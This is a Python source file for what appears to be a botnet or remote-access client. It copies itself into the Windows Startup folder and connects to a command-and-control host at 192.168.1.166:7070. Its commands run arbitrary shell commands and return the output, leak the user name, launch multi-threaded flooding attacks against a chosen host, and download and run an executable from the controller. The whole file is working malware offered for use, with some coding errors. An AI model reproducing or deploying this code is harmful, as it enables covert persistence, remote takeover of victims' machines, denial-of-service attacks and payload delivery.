import socket
import os
import time
import getpass
import threading
import subprocess

#
try:
    body = open('Client.py','r').read()
    user = os.environ['HOME']
    f = open(str(user+'/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/special.py'),'w')
    f.write(body)
    f.close()
except:
    pass
#

def ddos(h,p):
    d = socket.socket()
    d.connect((h,p))
    while True:
        d.send('Vortex Is King'.encode())

s = socket.socket()
while True:
    try:
        s.connect(('192.168.1.166',7070))
        break
    except:
        pass
    time.sleep(5)
while True:
    try:
        cmd = s.recv(1024)
    except:
        while True:
            s.close()
            s = socket.socket()
            try:
                s.connect(('192.168.1.166',7070))
                break
            except:
                pass
    if cmd == 'alive':
        s.send('yes')
    elif cmd == 'close':
        pid = os.getpid()
        os.system("taskill /F /PID "+pid)
    elif cmd == 'info':
        info = "User: "+getpass.getuser()+" | Exec Path: "+os.getcwd()
        s.send(info)
        #s.send(str(os.environ).encode())
    elif 'DDOS' in cmd:
        host = cmd.split(':')[1]
        port = int(cmd.split(':')[2])
        for x in range(25):
            threading.Thread(target=ddos, args=(host,port,)).start()
    elif 'sp' in cmd:
        cmd = cmd.split(':')[1]
        output = subprocess.check_output(cmd, shell=True)
        s.send("out:"+output)
    elif cmd == 'exploit':
        os.system('start http://192.168.1.166/Artemis.exe')
        time.sleep(7)
        user = os.environ['home']
        os.system(user+'\\Downloads\\Artemis.exe')
    else:
        os.system(cmd)
